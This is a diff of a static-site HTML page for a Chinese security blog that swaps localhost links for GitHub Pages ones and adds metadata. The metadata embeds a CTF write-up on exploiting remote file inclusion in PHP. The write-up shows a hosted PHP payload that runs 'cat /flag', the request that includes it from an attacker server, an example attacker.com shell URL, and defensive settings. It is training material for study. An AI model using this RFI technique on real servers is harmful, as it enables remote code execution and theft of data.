@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto" data-theme="auto">
 
-<head><script src="/san-blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=san-blog/livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>CTFHub RFI 远程文件包含漏洞利用详解 | 东阳的安全笔记</title>
 <meta name="keywords" content="CTF, Web安全, RFI, 远程文件包含, CTFHub, 文件包含">
 <meta name="description" content="题目信息
@@ -39,16 +39,16 @@ system(&#34;cat /flag&#34;);
 2. 发送包含请求
 通过 Postman 或浏览器构造请求：">
 <meta name="author" content="东阳">
-<link rel="canonical" href="http://localhost:1313/san-blog/posts/ctfhub-rfi-shell/">
+<link rel="canonical" href="https://Samantha09.github.io/san-blog/posts/ctfhub-rfi-shell/">
 <link crossorigin="anonymous" href="/san-blog/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/san-blog/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/san-blog/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/san-blog/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/san-blog/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/san-blog/safari-pinned-tab.svg">
+<link rel="icon" href="https://Samantha09.github.io/san-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://Samantha09.github.io/san-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://Samantha09.github.io/san-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://Samantha09.github.io/san-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://Samantha09.github.io/san-blog/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/san-blog/posts/ctfhub-rfi-shell/">
+<link rel="alternate" hreflang="en" href="https://Samantha09.github.io/san-blog/posts/ctfhub-rfi-shell/">
 <noscript>
     <style>
         #theme-toggle,
@@ -94,13 +94,96 @@ system(&#34;cat /flag&#34;);
         document.querySelector("html").dataset.theme = 'light';
     }
 
+</script><meta property="og:url" content="https://Samantha09.github.io/san-blog/posts/ctfhub-rfi-shell/">
+  <meta property="og:site_name" content="东阳的安全笔记">
+  <meta property="og:title" content="CTFHub RFI 远程文件包含漏洞利用详解">
+  <meta property="og:description" content="题目信息 类型：Web / 文件包含漏洞 靶场：CTFHub 核心漏洞：远程文件包含（Remote File Inclusion, RFI） 目标：通过 RFI 获取服务器 shell 并读取 flag 隐私声明：本文中所有敏感 IP 地址均已做屏蔽处理，统一替换为 xxx.xxx.xxx.xxx，避免暴露真实目标资产。
+漏洞分析 远程文件包含（RFI）是 PHP 文件包含漏洞的一种高危利用方式。当应用程序使用 include()、require() 等函数加载文件时，如果用户可控的参数未经过严格过滤，攻击者就可以构造恶意 URL，让服务器加载并执行远程服务器上的 PHP 脚本。
+本题的关键利用点：
+页面存在 ?file= 参数，用于指定要包含的文件路径 服务器配置中 allow_url_include 或 allow_url_fopen 开启，允许包含远程 URL 攻击者可以在自己控制的服务器上托管恶意 PHP 代码，通过 ?file=http://xxx.xxx.xxx.xxx:8000/yjh.txt 触发执行 利用步骤 1. 准备恶意payload 在攻击者可控的服务器（IP：xxx.xxx.xxx.xxx，端口：8000）上放置文件 yjh.txt，内容如下：
+&lt;?php system(&#34;cat /flag&#34;); ?&gt; 注意：文件名使用了 .txt 后缀，这是为了绕过部分简单的后缀检测。由于 PHP 的 include() 函数在包含远程文件时会执行其中的 PHP 代码，因此即使后缀是 .txt，其中的 PHP 代码依然会被解析执行。
+2. 发送包含请求 通过 Postman 或浏览器构造请求：">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-06-06T10:00:00+08:00">
+    <meta property="article:modified_time" content="2026-06-06T10:00:00+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Web安全">
+    <meta property="article:tag" content="RFI">
+    <meta property="article:tag" content="远程文件包含">
+    <meta property="article:tag" content="CTFHub">
+    <meta property="article:tag" content="文件包含">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="CTFHub RFI 远程文件包含漏洞利用详解">
+  <meta name="twitter:description" content="题目信息 类型：Web / 文件包含漏洞 靶场：CTFHub 核心漏洞：远程文件包含（Remote File Inclusion, RFI） 目标：通过 RFI 获取服务器 shell 并读取 flag 隐私声明：本文中所有敏感 IP 地址均已做屏蔽处理，统一替换为 xxx.xxx.xxx.xxx，避免暴露真实目标资产。
+漏洞分析 远程文件包含（RFI）是 PHP 文件包含漏洞的一种高危利用方式。当应用程序使用 include()、require() 等函数加载文件时，如果用户可控的参数未经过严格过滤，攻击者就可以构造恶意 URL，让服务器加载并执行远程服务器上的 PHP 脚本。
+本题的关键利用点：
+页面存在 ?file= 参数，用于指定要包含的文件路径 服务器配置中 allow_url_include 或 allow_url_fopen 开启，允许包含远程 URL 攻击者可以在自己控制的服务器上托管恶意 PHP 代码，通过 ?file=http://xxx.xxx.xxx.xxx:8000/yjh.txt 触发执行 利用步骤 1. 准备恶意payload 在攻击者可控的服务器（IP：xxx.xxx.xxx.xxx，端口：8000）上放置文件 yjh.txt，内容如下：
+&lt;?php system(&#34;cat /flag&#34;); ?&gt; 注意：文件名使用了 .txt 后缀，这是为了绕过部分简单的后缀检测。由于 PHP 的 include() 函数在包含远程文件时会执行其中的 PHP 代码，因此即使后缀是 .txt，其中的 PHP 代码依然会被解析执行。
+2. 发送包含请求 通过 Postman 或浏览器构造请求：">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://Samantha09.github.io/san-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CTFHub RFI 远程文件包含漏洞利用详解",
+      "item": "https://Samantha09.github.io/san-blog/posts/ctfhub-rfi-shell/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CTFHub RFI 远程文件包含漏洞利用详解",
+  "name": "CTFHub RFI 远程文件包含漏洞利用详解",
+  "description": "题目信息 类型：Web / 文件包含漏洞 靶场：CTFHub 核心漏洞：远程文件包含（Remote File Inclusion, RFI） 目标：通过 RFI 获取服务器 shell 并读取 flag 隐私声明：本文中所有敏感 IP 地址均已做屏蔽处理，统一替换为 xxx.xxx.xxx.xxx，避免暴露真实目标资产。\n漏洞分析 远程文件包含（RFI）是 PHP 文件包含漏洞的一种高危利用方式。当应用程序使用 include()、require() 等函数加载文件时，如果用户可控的参数未经过严格过滤，攻击者就可以构造恶意 URL，让服务器加载并执行远程服务器上的 PHP 脚本。\n本题的关键利用点：\n页面存在 ?file= 参数，用于指定要包含的文件路径 服务器配置中 allow_url_include 或 allow_url_fopen 开启，允许包含远程 URL 攻击者可以在自己控制的服务器上托管恶意 PHP 代码，通过 ?file=http://xxx.xxx.xxx.xxx:8000/yjh.txt 触发执行 利用步骤 1. 准备恶意payload 在攻击者可控的服务器（IP：xxx.xxx.xxx.xxx，端口：8000）上放置文件 yjh.txt，内容如下：\n\u0026lt;?php system(\u0026#34;cat /flag\u0026#34;); ?\u0026gt; 注意：文件名使用了 .txt 后缀，这是为了绕过部分简单的后缀检测。由于 PHP 的 include() 函数在包含远程文件时会执行其中的 PHP 代码，因此即使后缀是 .txt，其中的 PHP 代码依然会被解析执行。\n2. 发送包含请求 通过 Postman 或浏览器构造请求：\n",
+  "keywords": [
+    "CTF", "Web安全", "RFI", "远程文件包含", "CTFHub", "文件包含"
+  ],
+  "articleBody": "题目信息 类型：Web / 文件包含漏洞 靶场：CTFHub 核心漏洞：远程文件包含（Remote File Inclusion, RFI） 目标：通过 RFI 获取服务器 shell 并读取 flag 隐私声明：本文中所有敏感 IP 地址均已做屏蔽处理，统一替换为 xxx.xxx.xxx.xxx，避免暴露真实目标资产。\n漏洞分析 远程文件包含（RFI）是 PHP 文件包含漏洞的一种高危利用方式。当应用程序使用 include()、require() 等函数加载文件时，如果用户可控的参数未经过严格过滤，攻击者就可以构造恶意 URL，让服务器加载并执行远程服务器上的 PHP 脚本。\n本题的关键利用点：\n页面存在 ?file= 参数，用于指定要包含的文件路径 服务器配置中 allow_url_include 或 allow_url_fopen 开启，允许包含远程 URL 攻击者可以在自己控制的服务器上托管恶意 PHP 代码，通过 ?file=http://xxx.xxx.xxx.xxx:8000/yjh.txt 触发执行 利用步骤 1. 准备恶意payload 在攻击者可控的服务器（IP：xxx.xxx.xxx.xxx，端口：8000）上放置文件 yjh.txt，内容如下：\n\u003c?php system(\"cat /flag\"); ?\u003e 注意：文件名使用了 .txt 后缀，这是为了绕过部分简单的后缀检测。由于 PHP 的 include() 函数在包含远程文件时会执行其中的 PHP 代码，因此即使后缀是 .txt，其中的 PHP 代码依然会被解析执行。\n2. 发送包含请求 通过 Postman 或浏览器构造请求：\nPOST http://challenge-xxx.sandbox.ctfhub.com:10800/?file=http://xxx.xxx.xxx.xxx:8000/yjh.txt 请求体（form-data）：\nKey Value haha system(\"cat /flag\"); 3. 获取flag 服务器成功包含远程文件后，执行了 system(\"cat /flag\") 命令，在响应中回显了 flag：\nctfhub{795edc0ee1c67318f16e2eb3} 同时页面还回显了提示信息：\n\u003chr\u003e i don't have shell, how to get flag?\u003cbr\u003e \u003ca href=\"phpinfo.php\"\u003ephpinfo\u003c/a\u003e 这说明目标服务器原本是一个无 shell 的受限环境，但利用 RFI 漏洞，我们成功实现了任意代码执行并读取到了 flag。\n原理解析 为什么 .txt 文件也能执行 PHP？ 当 PHP 使用 include()、require() 等函数包含远程文件时：\nPHP 会发起 HTTP 请求获取远程文件内容 获取到的内容会被当作 PHP 代码解析执行 文件扩展名不影响 PHP 解析器的行为，关键是内容中是否包含 \u003c?php ... ?\u003e 标签 因此，攻击者可以将恶意 PHP 代码保存在任意扩展名的文件中（如 .txt、.jpg 等），只要被 include() 加载，就会执行。\nRFI vs LFI 特性 LFI（本地文件包含） RFI（远程文件包含） 包含来源 服务器本地文件 远程服务器文件 利用条件 需要可控文件路径 需要 allow_url_include=On 危害程度 可读取本地敏感文件 直接获取远程代码执行（RCE） 典型利用 包含 /etc/passwd、日志文件 包含 http://attacker.com/shell.txt RFI 的危害通常比 LFI 更大，因为它能直接引入外部恶意代码，无需依赖服务器上已有的文件。\n防御措施 关闭远程文件包含功能 在 php.ini 中设置：\nallow_url_fopen = Off allow_url_include = Off 严格过滤用户输入 对 file 等参数进行白名单校验，只允许包含预定义的安全文件。\n使用绝对路径 避免直接使用用户输入拼接文件路径。\n文件包含前校验 使用 realpath() 和 strpos() 确保被包含文件位于允许访问的目录内。\n总结 本题通过 RFI 漏洞，将无 shell 的受限环境转化为完整的代码执行能力。核心思路是：\n发现 ?file= 参数存在文件包含 验证服务器支持远程 URL 包含 在可控服务器上托管 PHP 恶意代码 通过 ?file=http://xxx.xxx.xxx.xxx:8000/yjh.txt 触发执行 成功读取 /flag 获取 flag RFI 是 Web 渗透中非常经典的漏洞类型，理解其原理和防御方法对于安全开发和渗透测试都至关重要。\n",
+  "wordCount" : "208",
+  "inLanguage": "en",
+  "datePublished": "2026-06-06T10:00:00+08:00",
+  "dateModified": "2026-06-06T10:00:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "东阳"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://Samantha09.github.io/san-blog/posts/ctfhub-rfi-shell/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "东阳的安全笔记",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://Samantha09.github.io/san-blog/favicon.ico"
+    }
+  }
+}
 </script>
 </head>
 <body id="top">
     <header class="header">
     <nav class="header-nav">
         <div class="logo">
-            <a href="http://localhost:1313/san-blog/" accesskey="h" title="东阳的安全笔记 (Alt + H)">东阳的安全笔记</a>
+            <a href="https://Samantha09.github.io/san-blog/" accesskey="h" title="东阳的安全笔记 (Alt + H)">东阳的安全笔记</a>
             <div class="logo-switches">
                 <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
@@ -126,27 +209,27 @@ system(&#34;cat /flag&#34;);
         </div>
         <ul id="menu" class="menu">
             <li>
-                <a href="http://localhost:1313/san-blog/" title="首页">
+                <a href="https://Samantha09.github.io/san-blog/" title="首页">
                     <span>首页</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/posts/" title="文章">
+                <a href="https://Samantha09.github.io/san-blog/posts/" title="文章">
                     <span>文章</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/tags/" title="标签">
+                <a href="https://Samantha09.github.io/san-blog/tags/" title="标签">
                     <span>标签</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/categories/" title="分类">
+                <a href="https://Samantha09.github.io/san-blog/categories/" title="分类">
                     <span>分类</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/archives/" title="归档">
+                <a href="https://Samantha09.github.io/san-blog/archives/" title="归档">
                     <span>归档</span>
                 </a>
             </li>
@@ -316,19 +399,19 @@ system(&#34;cat /flag&#34;);
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:1313/san-blog/tags/ctf/">CTF</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/web%E5%AE%89%E5%85%A8/">Web安全</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/rfi/">RFI</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">远程文件包含</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/ctfhub/">CTFHub</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/ctf/">CTF</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/web%E5%AE%89%E5%85%A8/">Web安全</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/rfi/">RFI</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">远程文件包含</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/ctfhub/">CTFHub</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></li>
     </ul>
 <nav class="paginav">
-  <a class="prev" href="http://localhost:1313/san-blog/posts/command-injection-filter-bypass/">
+  <a class="prev" href="https://Samantha09.github.io/san-blog/posts/command-injection-filter-bypass/">
     <span class="title">« Prev</span>
     <span>命令注入综合过滤绕过实战：从空格到管道的一条龙</span>
   </a>
-  <a class="next" href="http://localhost:1313/san-blog/posts/php-filter-read-source-code/">
+  <a class="next" href="https://Samantha09.github.io/san-blog/posts/php-filter-read-source-code/">
     <span class="title">Next »</span>
     <span>php://filter 伪协议：在文件包含中读取源代码</span>
   </a>
@@ -339,7 +422,7 @@ system(&#34;cat /flag&#34;);
     </main>
     
 <footer class="footer">
-        <span>&copy; 2026 <a href="http://localhost:1313/san-blog/">东阳的安全笔记</a></span> · 
+        <span>&copy; 2026 <a href="https://Samantha09.github.io/san-blog/">东阳的安全笔记</a></span> · 
 
     
     
